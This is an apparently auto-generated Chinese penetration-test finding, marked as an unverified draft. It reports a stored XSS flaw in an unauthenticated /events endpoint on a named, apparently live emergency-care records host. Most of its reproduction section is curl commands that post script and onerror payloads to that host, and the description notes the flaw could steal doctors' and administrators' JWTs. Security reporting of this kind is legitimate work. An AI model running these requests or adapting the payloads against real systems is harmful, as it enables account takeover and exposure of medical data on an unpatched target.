# POC/EXP — 4001 /events 无认证 POST 写入未转义字段，形成 Stored XSS

> 漏洞ID: `c98e7630-23f7-4093-b9a9-219904db9cd7`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4001/events`

**類型**: Stored XSS

## 描述

4001 vitalSignVideoServer 的 /events 接口支持无认证 POST 创建记录，且 TypeOfEventTxt/Annotation 等字段未做 HTML 转义，攻击者可写入 <script> 或 <img onerror> 形成 Stored XSS。当医生或管理员在 4000 前端查看事件列表时，脚本在浏览器上下文执行，可窃取 JWT/LocalStorge 或发起同源请求。

## 前置條件

公网可达 https://epcr.tpf.gov.tw:4001；有医生/管理员账号可登录 4000 前端查看事件列表

## POC / 復現步驟

```
curl -sk -X POST 'https://epcr.tpf.gov.tw:4001/events' -H 'Content-Type: application/json' -d '{"CaseID":"test","TypeOfEventTxt":"<script>alert(1)</script>","recordUuid":"test","Systolic":120,"Diastolic":80,"Pulse":62}' 返回 HTTP 201，body 中 TypeOfEventTxt 原样为 <script>alert(1)</script>；curl -sk 'https://epcr.tpf.gov.tw:4001/events?recordUuid=test&limit=1' 返回历史记录中 Annotation 字段含 <img src=x onerror=alert(1)>
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
